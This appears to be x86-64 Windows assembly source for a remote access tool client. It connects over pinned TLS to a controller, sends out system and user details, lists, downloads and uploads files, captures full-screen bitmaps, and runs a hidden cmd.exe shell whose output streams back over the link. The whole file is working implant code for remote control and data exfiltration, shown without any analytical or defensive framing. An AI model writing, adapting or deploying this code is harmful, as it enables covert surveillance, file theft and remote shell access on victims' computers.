; ---------------------------------------------------------------- session
session:
    push rbp
    mov rbp, rsp
    sub rsp, 0x20
    call tcp_connect
    test eax, eax
    jnz .out
    call tls_handshake
    test eax, eax
    jz .close
    call tls_pin
    test eax, eax
    jz .close
    call auth
    test eax, eax
    jz .close
    call hello
    test eax, eax
    jz .close
    mov dword [rel g_run], 1
    call session_loop
.close:
    mov dword [rel g_run], 0
    call shell_stop
    call tls_free
    mov rcx, [rel g_sock]
    cmp rcx, -1
    je .out
    call [rel __imp_closesocket]
    mov qword [rel g_sock], -1
.out:
    leave
    ret

; ---------------------------------------------------------------- sysinfo
sysinfo:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    sub rsp, 0x40
    lea rbx, [rel resp]
    mov dword [rel hostlen], 256
    lea rcx, [rel hostbuf]
    lea rdx, [rel hostlen]
    call [rel __imp_GetComputerNameA]
    test eax, eax
    jnz .h
    mov byte [rel hostbuf], 0
.h:
    mov dword [rel userlen], 256
    lea rcx, [rel userbuf]
    lea rdx, [rel userlen]
    call [rel __imp_GetUserNameA]
    test eax, eax
    jnz .u
    mov byte [rel userbuf], 0
.u:
    call os_name
    mov r12, rax
    mov rcx, rbx
    lea rdx, [rel fmt_host]
    lea r8, [rel hostbuf]
    lea r9, [rel userbuf]
    mov [rsp+32], r12
    mov eax, [rel osbuild]
    mov [rsp+40], rax
    call [rel __imp_wsprintfA]
    add rbx, rax
    call [rel __imp_GetTickCount64]
    xor edx, edx
    mov ecx, 1000
    div rcx
    xor edx, edx
    mov ecx, 86400
    div rcx
    mov r12, rax
    mov rax, rdx
    xor edx, edx
    mov ecx, 3600
    div rcx
    mov r13, rax
    mov rax, rdx
    xor edx, edx
    mov ecx, 60
    div rcx
    mov r14, rax
    mov rcx, rbx
    lea rdx, [rel fmt_up]
    mov r8, r12
    mov r9, r13
    mov [rsp+32], r14
    call [rel __imp_wsprintfA]
    add rbx, rax
    mov dword [rel cpusz], 128
    mov ecx, HKEY_LOCAL_MACHINE
    lea rdx, [rel cpukey]
    lea r8, [rel cpuval]
    mov r9d, RRF_RT_ANY
    mov qword [rsp+32], 0
    lea rax, [rel cpusb]
    mov [rsp+40], rax
    lea rax, [rel cpusz]
    mov [rsp+48], rax
    call [rel __imp_RegGetValueA]
    mov byte [rel cpusb+127], 0
    mov ecx, 0xFFFF
    call [rel __imp_GetActiveProcessorCount]
    mov r13d, eax
    mov rcx, rbx
    lea rdx, [rel fmt_cpu]
    lea r8, [rel cpusb]
    mov r9d, r13d
    call [rel __imp_wsprintfA]
    add rbx, rax
    mov dword [rel ms], 64
    lea rcx, [rel ms]
    call [rel __imp_GlobalMemoryStatusEx]
    mov rax, [rel ms+8]
    shr rax, 20
    mov r12, rax
    mov rax, [rel ms+16]
    shr rax, 20
    mov r13, rax
    mov r14d, [rel ms+4]
    mov rcx, rbx
    lea rdx, [rel fmt_ram]
    mov r8, r12
    mov r9, r13
    mov [rsp+32], r14
    call [rel __imp_wsprintfA]
    add rbx, rax
    mov ecx, 260
    lea rdx, [rel cwdbuf]
    call [rel __imp_GetCurrentDirectoryA]
    call [rel __imp_GetCurrentProcessId]
    mov r12d, eax
    mov rcx, rbx
    lea rdx, [rel fmt_cwd]
    lea r8, [rel cwdbuf]
    mov r9d, r12d
    call [rel __imp_wsprintfA]
    add rbx, rax
    mov r8, rbx
    lea rax, [rel resp]
    sub r8, rax
    mov ecx, C_SYSINFO
    lea rdx, [rel resp]
    call frame_send
    add rsp, 0x40
    pop r14
    pop r13
    pop r12
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- fs_list
; rcx = path, edx = len
fs_list:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    sub rsp, 0x18
    lea rdi, [rel globbuf]
    mov r10, rcx
    mov r8d, edx
    test r8d, r8d
    jz .def
    cmp r8d, 900
    jbe .cp
    mov r8d, 900
.cp:
    mov rsi, r10
    mov ecx, r8d
    rep movsb
    cmp byte [rdi-1], '\'
    je .star
    cmp byte [rdi-1], '/'
    je .star
    mov byte [rdi], '\'
    inc rdi
.star:
    mov byte [rdi], '*'
    inc rdi
    mov byte [rdi], 0
    jmp .find
.def:
    lea rsi, [rel defpath]
    mov ecx, 3
    rep movsb
    mov byte [rdi], '*'
    inc rdi
    mov byte [rdi], 0
.find:
    lea rcx, [rel globbuf]
    lea rdx, [rel finddat]
    call [rel __imp_FindFirstFileA]
    cmp rax, -1
    jne .got
    mov ecx, C_FS_LIST_RESP
    lea rdx, [rel errlist]
    mov r8d, 19
    call frame_send
    jmp .out
.got:
    mov r12, rax
    lea rbx, [rel resp]
    mov rdi, rbx
.entry:
    lea rsi, [rel finddat+44]
    mov rcx, rsi
    call [rel __imp_lstrlenA]
    mov ecx, eax
    rep movsb
    mov byte [rdi], '|'
    inc rdi
    mov eax, [rel finddat+32]
    mov edx, [rel finddat+28]
    shl rdx, 32
    or rax, rdx
    mov rdx, rax
    call u64_dec
    mov byte [rdi], '|'
    inc rdi
    test dword [rel finddat], FILE_ATTRIBUTE_DIRECTORY
    jz .f
    mov byte [rdi], 'd'
    jmp .m
.f:
    mov byte [rdi], 'f'
.m:
    inc rdi
    mov byte [rdi], 10
    inc rdi
    lea rax, [rel resp+990000]
    cmp rdi, rax
    jae .stop
    mov rcx, r12
    lea rdx, [rel finddat]
    call [rel __imp_FindNextFileA]
    test eax, eax
    jnz .entry
.stop:
    mov rcx, r12
    call [rel __imp_FindClose]
    mov r8, rdi
    sub r8, rbx
    mov ecx, C_FS_LIST_RESP
    mov rdx, rbx
    call frame_send
.out:
    add rsp, 0x18
    pop r13
    pop r12
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- fs_get
fs_get:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    sub rsp, 0x38
    lea rcx, [rel payload]
    mov edx, GENERIC_READ
    mov r8d, (FILE_SHARE_READ | FILE_SHARE_WRITE)
    xor r9d, r9d
    mov qword [rsp+32], OPEN_EXISTING
    mov qword [rsp+40], FILE_ATTRIBUTE_NORMAL
    mov qword [rsp+48], 0
    call [rel __imp_CreateFileA]
    cmp rax, -1
    jne .open
    mov ecx, C_FS_FILE
    lea rdx, [rel errread]
    mov r8d, 18
    call frame_send
    jmp .out
.open:
    mov rbx, rax
    mov rcx, rbx
    lea rdx, [rel fsize]
    call [rel __imp_GetFileSizeEx]
    test eax, eax
    jz .bad
    lea rcx, [rel payload]
    call [rel __imp_lstrlenA]
    mov r12d, eax
    mov rax, [rel fsize]
    add rax, r12
    add rax, 3
    cmp rax, 990000
    ja .tall
    lea rdi, [rel resp]
    mov byte [rdi], 'D'
    inc rdi
    lea rsi, [rel payload]
    mov ecx, r12d
    rep movsb
    mov byte [rdi], 10
    inc rdi
    mov rcx, rbx
    mov rdx, rdi
    mov r8d, [rel fsize]
    lea r9, [rel bread]
    mov qword [rsp+32], 0
    call [rel __imp_ReadFile]
    mov r13d, eax
    test eax, eax
    jz .bad
    mov r8d, r12d
    add r8d, [rel bread]
    add r8d, 2
    mov ecx, C_FS_FILE
    lea rdx, [rel resp]
    call frame_send
    jmp .close
.tall:
    mov ecx, C_FS_FILE
    lea rdx, [rel errtall]
    mov r8d, 16
    call frame_send
    jmp .close
.bad:
    mov ecx, C_FS_FILE
    lea rdx, [rel errread]
    mov r8d, 18
    call frame_send
.close:
    mov rcx, rbx
    call [rel __imp_CloseHandle]
.out:
    add rsp, 0x38
    pop r13
    pop r12
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- fs_put
fs_put:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    sub rsp, 0x40
    lea rbx, [rel payload]
    mov r12d, [rel g_len]
.find:
    test r12d, r12d
    jz .out
    cmp byte [rbx], 10
    je .have
    inc rbx
    dec r12d
    jmp .find
.have:
    mov byte [rbx], 0
    inc rbx
    dec r12d
    lea rcx, [rel payload]
    mov edx, GENERIC_WRITE
    xor r8d, r8d
    xor r9d, r9d
    mov qword [rsp+32], CREATE_ALWAYS
    mov qword [rsp+40], FILE_ATTRIBUTE_NORMAL
    mov qword [rsp+48], 0
    call [rel __imp_CreateFileA]
    cmp rax, -1
    je .out
    mov rcx, rax
    mov rdx, rbx
    mov r8d, r12d
    lea r9, [rel bread]
    mov qword [rsp+32], 0
    mov rbx, rax
    call [rel __imp_WriteFile]
    mov rcx, rbx
    call [rel __imp_CloseHandle]
.out:
    add rsp, 0x40
    pop r12
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- screen
screen:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15
    sub rsp, 0x48
    mov ecx, SM_CXVIRTUALSCREEN
    call [rel __imp_GetSystemMetrics]
    mov r12d, eax
    mov ecx, SM_CYVIRTUALSCREEN
    call [rel __imp_GetSystemMetrics]
    mov r13d, eax
    mov ecx, SM_XVIRTUALSCREEN
    call [rel __imp_GetSystemMetrics]
    mov r14d, eax
    mov ecx, SM_YVIRTUALSCREEN
    call [rel __imp_GetSystemMetrics]
    mov r15d, eax
    test r12d, r12d
    jle .out
    test r13d, r13d
    jle .out
    lea eax, [r12+r12*2]
    add eax, 3
    and eax, -4
    imul eax, r13d
    test eax, eax
    jle .out
    cmp eax, 60000000
    ja .out
    mov ecx, eax
    add rcx, 54
    mov [rel fsize], rcx
    xor ecx, ecx
    mov rdx, [rel fsize]
    mov r8d, MEM_COMMIT_RESERVE
    mov r9d, PAGE_READWRITE
    call [rel __imp_VirtualAlloc]
    test rax, rax
    jz .out
    mov [rel g_px], rax
    mov rdi, rax
    mov word [rdi], 0x4D42
    mov rcx, [rel fsize]
    mov [rdi+2], ecx
    mov qword [rdi+6], 0
    mov dword [rdi+10], 54
    mov dword [rdi+14], 40
    mov [rdi+18], r12d
    mov [rdi+22], r13d
    mov word [rdi+26], 1
    mov word [rdi+28], 24
    mov dword [rdi+30], 0
    mov dword [rdi+34], 0
    mov dword [rdi+38], 0
    mov dword [rdi+42], 0
    mov dword [rdi+46], 0
    mov dword [rdi+50], 0
    xor ecx, ecx
    call [rel __imp_GetDC]
    mov rbx, rax
    test rbx, rbx
    jz .free
    mov rcx, rbx
    call [rel __imp_CreateCompatibleDC]
    mov [rel g_memdc], rax
    test rax, rax
    jz .relscr
    mov rcx, rbx
    mov edx, r12d
    mov r8d, r13d
    call [rel __imp_CreateCompatibleBitmap]
    mov [rel g_bmp], rax
    test rax, rax
    jz .reldc
    mov rcx, [rel g_memdc]
    mov rdx, rax
    call [rel __imp_SelectObject]
    mov [rel g_old], rax
    mov rcx, [rel g_memdc]
    xor edx, edx
    xor r8d, r8d
    mov r9d, r12d
    mov [rsp+32], r13d
    mov [rsp+40], rbx
    movsxd rax, r14d
    mov [rsp+48], rax
    movsxd rax, r15d
    mov [rsp+56], rax
    mov qword [rsp+64], SRCCOPY_CAPTURE
    call [rel __imp_BitBlt]
    test eax, eax
    jz .delbmp
    mov rcx, [rel g_memdc]
    mov rdx, [rel g_bmp]
    xor r8d, r8d
    mov r9d, r13d
    mov rax, [rel g_px]
    add rax, 54
    mov [rsp+32], rax
    mov rax, [rel g_px]
    add rax, 14
    mov [rsp+40], rax
    mov qword [rsp+48], 0
    call [rel __imp_GetDIBits]
    test eax, eax
    jz .delbmp
    mov ecx, C_SCREEN_IMG
    mov rdx, [rel g_px]
    mov r8d, [rel fsize]
    call frame_send
.delbmp:
    mov rcx, [rel g_memdc]
    mov rdx, [rel g_old]
    call [rel __imp_SelectObject]
    mov rcx, [rel g_bmp]
    call [rel __imp_DeleteObject]
.reldc:
    mov rcx, [rel g_memdc]
    call [rel __imp_DeleteDC]
.relscr:
    xor ecx, ecx
    mov rdx, rbx
    call [rel __imp_ReleaseDC]
.free:
    mov rcx, [rel g_px]
    xor edx, edx
    mov r8d, MEM_RELEASE
    call [rel __imp_VirtualFree]
.out:
    add rsp, 0x48
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- shell_start
shell_start:
    push rbp
    mov rbp, rsp
    push rbx
    sub rsp, 0x58
    call shell_stop
    mov dword [rel sa], 24
    mov qword [rel sa+8], 0
    mov dword [rel sa+16], 1
    lea rcx, [rel g_inR]
    lea rdx, [rel g_inW]
    lea r8, [rel sa]
    xor r9d, r9d
    call [rel __imp_CreatePipe]
    test eax, eax
    jz .out
    lea rcx, [rel g_outR]
    lea rdx, [rel g_outW]
    lea r8, [rel sa]
    xor r9d, r9d
    call [rel __imp_CreatePipe]
    test eax, eax
    jnz .pipes
    mov rcx, [rel g_inR]
    call [rel __imp_CloseHandle]
    mov rcx, [rel g_inW]
    call [rel __imp_CloseHandle]
    jmp .out
.pipes:
    mov rcx, [rel g_inW]
    mov edx, 1
    xor r8d, r8d
    call [rel __imp_SetHandleInformation]
    mov rcx, [rel g_outR]
    mov edx, 1
    xor r8d, r8d
    call [rel __imp_SetHandleInformation]
    lea rdi, [rel sui]
    xor eax, eax
    mov ecx, 13
    rep stosq
    lea rdi, [rel pi]
    mov ecx, 3
    rep stosq
    mov dword [rel sui], 104
    mov dword [rel sui+60], (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW)
    mov dword [rel sui+64], 0
    mov rax, [rel g_inR]
    mov [rel sui+80], rax
    mov rax, [rel g_outW]
    mov [rel sui+88], rax
    mov [rel sui+96], rax
    xor ecx, ecx
    lea rdx, [rel cmdline]
    xor r8d, r8d
    xor r9d, r9d
    mov qword [rsp+32], 1
    mov qword [rsp+40], CREATE_NO_WINDOW
    mov qword [rsp+48], 0
    mov qword [rsp+56], 0
    lea rax, [rel sui]
    mov [rsp+64], rax
    lea rax, [rel pi]
    mov [rsp+72], rax
    call [rel __imp_CreateProcessA]
    test eax, eax
    jz .fail
    mov rax, [rel pi]
    mov [rel g_shellProc], rax
    mov rax, [rel g_inW]
    mov [rel g_shellIn], rax
    mov rcx, [rel g_inR]
    call [rel __imp_CloseHandle]
    mov rcx, [rel g_outW]
    call [rel __imp_CloseHandle]
    mov rcx, [rel pi+8]
    call [rel __imp_CloseHandle]
    xor ecx, ecx
    xor edx, edx
    lea r8, [rel shell_reader]
    mov r9, [rel g_outR]
    mov qword [rsp+32], 0
    lea rax, [rel g_tid]
    mov [rsp+40], rax
    call [rel __imp_CreateThread]
    mov [rel g_shellThread], rax
    test rax, rax
    jnz .out
    mov rcx, [rel g_outR]
    call [rel __imp_CloseHandle]
    jmp .out
.fail:
    mov rcx, [rel g_inR]
    call [rel __imp_CloseHandle]
    mov rcx, [rel g_inW]
    call [rel __imp_CloseHandle]
    mov rcx, [rel g_outR]
    call [rel __imp_CloseHandle]
    mov rcx, [rel g_outW]
    call [rel __imp_CloseHandle]
.out:
    add rsp, 0x58
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- shell_stop
shell_stop:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    sub rsp, 0x18
    mov rbx, [rel g_shellProc]
    mov r12, [rel g_shellThread]
    mov r13, [rel g_shellIn]
    mov qword [rel g_shellProc], 0
    mov qword [rel g_shellThread], 0
    mov qword [rel g_shellIn], 0
    test rbx, rbx
    jz .noin
    mov rcx, rbx
    xor edx, edx
    call [rel __imp_TerminateProcess]
    mov rcx, rbx
    call [rel __imp_CloseHandle]
.noin:
    test r13, r13
    jz .noth
    mov rcx, r13
    call [rel __imp_CloseHandle]
.noth:
    test r12, r12
    jz .out
    mov rcx, r12
    mov edx, 1000
    call [rel __imp_WaitForSingleObject]
    mov rcx, r12
    call [rel __imp_CloseHandle]
.out:
    add rsp, 0x18
    pop r13
    pop r12
    pop rbx
    leave
    ret

; ---------------------------------------------------------------- shell_reader
shell_reader:
    push rbp
    mov rbp, rsp
    push rbx
    sub rsp, 0x28
    mov rbx, rcx
.loop:
    mov rcx, rbx
    lea rdx, [rel shbuf]
    mov r8d, 4096
    lea r9, [rel shread]
    mov qword [rsp+32], 0
    call [rel __imp_ReadFile]
    test eax, eax
    jz .done
    mov r8d, [rel shread]
    test r8d, r8d
    jz .done
    cmp dword [rel g_run], 0
    je .loop
    mov ecx, C_SHELL_DATA
    lea rdx, [rel shbuf]
    call frame_send
    jmp .loop
.done:
    mov rcx, rbx
    call [rel __imp_CloseHandle]
    cmp dword [rel g_run], 0
    je .out
    mov ecx, C_SHELL_CLOSE
    xor edx, edx
    xor r8d, r8d
    call frame_send
.out:
    xor eax, eax
    add rsp, 0x28
    pop rbx
    leave
    ret
